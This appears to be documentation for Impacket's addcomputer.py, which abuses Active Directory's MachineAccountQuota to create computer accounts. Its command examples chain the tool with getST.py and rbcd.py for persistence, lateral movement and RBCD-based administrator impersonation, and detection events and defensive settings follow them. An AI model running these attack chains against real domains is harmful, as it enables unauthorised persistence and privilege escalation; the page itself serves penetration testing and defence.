# addcomputer.py

## Overview
The `addcomputer.py` script allows attackers to add computer accounts to an Active Directory domain. This technique is useful for persistence and can be leveraged in various attack scenarios where you have credentials but need to establish a persistent presence in the domain.

## Detailed Description
This script leverages the `MachineAccountQuota` attribute in Active Directory, which by default allows any authenticated user to add up to 10 computer accounts to the domain. The script supports both SAMR over SMB (used by modern Windows) and LDAPS protocols for adding computer accounts.

### Key Features:
- Add computer accounts using SAMR over SMB
- Add computer accounts using LDAPS
- Set custom passwords for computer accounts
- Support for both password and hash authentication
- Kerberos authentication support

### Technical Details:
- Uses SAMR (Security Account Manager Remote) protocol
- Leverages the `SeMachineAccountPrivilege` or `MachineAccountQuota`
- Creates computer objects in the default Computers container
- Sets the `userAccountControl` attribute appropriately for computer accounts

## Command Line Options

```
usage: addcomputer.py [-h] [-computer-name COMPUTER_NAME] [-computer-pass COMPUTER_PASS]
                      [-method {SAMR,LDAPS}] [-port PORT] [-domain-netbios NETBIOSDOMAIN]
                      [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                      [-dc-host hostname] [-dc-ip ip] [-debug]
                      identity

Required Arguments:
  identity              [domain/]username[:password]

Optional Arguments:
  -computer-name        Name of computer to add (default: random)
  -computer-pass        Password for computer account (default: random)
  -method               Method to use (SAMR or LDAPS, default: SAMR)
  -port                 Port to connect to (default: 445 for SAMR, 636 for LDAPS)
  -domain-netbios       Domain NetBIOS name
  -hashes               NTLM hashes (LM:NT)
  -no-pass              Don't ask for password
  -k                    Use Kerberos authentication
  -aesKey               AES key for Kerberos authentication
  -dc-host              Domain controller hostname
  -dc-ip                Domain controller IP address
  -debug                Enable debug output
```

## Usage Examples

### Basic Usage
```bash
# Add computer with random name and password using SAMR
python3 addcomputer.py domain.com/user:password

# Add computer with specific name and password
python3 addcomputer.py domain.com/user:password -computer-name ATTACKPC01 -computer-pass P@ssw0rd123
```

### Using LDAPS Method
```bash
# Add computer using LDAPS (requires SSL/TLS)
python3 addcomputer.py domain.com/user:password -method LDAPS -computer-name EVILPC
```

### Using Hash Authentication
```bash
# Add computer using NTLM hash
python3 addcomputer.py domain.com/user -hashes :ntlmhash -computer-name MALWAREPC
```

### Using Kerberos Authentication
```bash
# Add computer using Kerberos (requires valid TGT)
python3 addcomputer.py domain.com/user -k -dc-ip 192.168.1.10 -computer-name KRBPC
```

## Attack Chain Integration

### Post-Exploitation Persistence
1. **Initial Access**: Gain credentials through various means
2. **Computer Addition**: Use `addcomputer.py` to create persistent computer account
3. **Authentication**: Use the computer account for subsequent operations
4. **Lateral Movement**: Leverage computer account for movement

```bash
# Step 1: Add computer account
python3 addcomputer.py domain.com/user:password -computer-name PERSIST01 -computer-pass MySecretPass123

# Step 2: Use computer account for authentication
python3 getST.py domain.com/PERSIST01$:MySecretPass123 -spn cifs/target.domain.com

# Step 3: Use service ticket for lateral movement
export KRB5CCNAME=PERSIST01$.ccache
python3 smbclient.py target.domain.com -k -no-pass
```

### Resource-Based Constrained Delegation (RBCD) Setup
```bash
# Step 1: Add computer account
python3 addcomputer.py domain.com/user:password -computer-name RBCD01 -computer-pass RBCDPass123

# Step 2: Configure RBCD on target
python3 rbcd.py domain.com/user:password -delegate-from RBCD01$ -delegate-to target$ -action write

# Step 3: Request service ticket
python3 getST.py domain.com/RBCD01$:RBCDPass123 -spn cifs/target.domain.com -impersonate administrator
```

## Prerequisites
- Valid domain credentials (user account)
- Network access to domain controller
- Domain must allow computer account creation (MachineAccountQuota > 0)
- For LDAPS: SSL/TLS certificate validation or certificate bypass

## Detection Considerations
- Event ID 4741: Computer account was created
- Unusual computer names or naming patterns
- Computer accounts created by non-administrative users
- Multiple computer accounts created by same user
- Monitor LDAP/SAMR connections for computer creation operations

## Defensive Measures
- Set `MachineAccountQuota` to 0 in domain
- Monitor computer account creation events
- Implement strict naming conventions for computer accounts
- Use Group Policy to restrict computer account creation
- Regular audit of computer accounts in domain

## Related Tools
- [rbcd.py](rbcd.md) - Configure Resource-Based Constrained Delegation
- [getST.py](getST.md) - Request service tickets using computer accounts
- [dacledit.py](dacledit.md) - Modify permissions on created computer accounts
- [GetADComputers.py](GetADComputers.md) - Enumerate computer accounts including newly created ones
